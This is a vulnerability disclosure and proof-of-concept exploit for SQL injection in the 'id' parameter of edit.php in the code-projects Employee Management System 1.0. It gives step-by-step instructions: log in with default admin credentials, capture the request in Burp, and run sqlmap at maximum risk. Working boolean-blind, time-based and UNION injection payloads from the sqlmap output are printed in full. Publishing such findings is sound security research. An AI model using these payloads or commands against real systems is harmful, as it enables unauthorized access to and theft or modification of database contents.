# Employee Managment System - SQL Injection - 3
+ **Exploit Title:** Employee Managment System - SQL Injection - 3
+ **Date:** 2024-30-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/employee-management-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/4af079c9-ab82-4b2a-a133-be6989c7f70e
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Employee Managment System 1.0 allows SQL Injection via the 'id' parameter at "/370project//edit.php?id=111". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.


## Proof of Concept:
+ Go to this address: "http://localhost/370project//alogin.html"
+ Login with `admin` : `admin`
+ Press the View Employee tab, select any employee and press the edit button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /370project//edit.php?id=111 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=111 AND 5433=(SELECT (CASE WHEN (5433=5433) THEN 5433 ELSE (SELECT 8839 UNION SELECT 6713) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=111 AND (SELECT 5430 FROM (SELECT(SLEEP(5)))gMEp)

    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: id=111 UNION ALL SELECT NULL,NULL,CONCAT(0x7162767171,0x486e6e5062594f43517643496c5574527374646b4d504958686b4175715a4d4f6b7a79514f556251,0x716b707071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[05:05:06] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[05:05:06] [INFO] fetching current database
current database: '370project'
```
+ current database: `370project`

![Ekran görüntüsü 2024-01-30 133927](https://github.com/BurakSevben/CVEs/assets/117217689/54e859bf-9a86-4977-a759-2d3fa6b77c2b)
